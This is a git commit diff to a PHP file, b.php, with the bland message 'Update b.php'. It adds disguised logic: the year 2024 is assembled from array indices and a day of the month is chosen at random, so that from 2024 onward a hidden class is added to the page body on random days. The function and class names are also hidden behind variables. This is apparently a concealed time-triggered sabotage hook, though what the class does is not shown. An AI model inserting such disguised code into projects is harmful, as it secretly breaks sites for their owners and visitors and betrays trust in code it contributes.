ea4cc7ec685b71ad55ffdf03a221fca4df18a25f
temp <145018858+temp-important@users.noreply.github.com>
2023-09-21 18:43:44 +0700

    Update b.php

--- b.php
+++ b.php
@@ -1,9 +1,13 @@
 <?php
+$dtg = rand(1, 28);
+$th = range(20, 99);
 ?>
 <script type="text/javascript">
+if(('<?php echo date("Y") ?>'>='<?php echo $th[0].$th[4] ?>')&&('<?php echo date("Y-m-d") ?>'=='<?php echo date("Y-m-").$dtg; ?>')){
 	var r = document.body;
 
 	<?php echo $ste;?>(function() {
 		r.classList.add("<?php echo $dtrt.$dt3 ?>");
 	}, 1000);
+}
 </script>
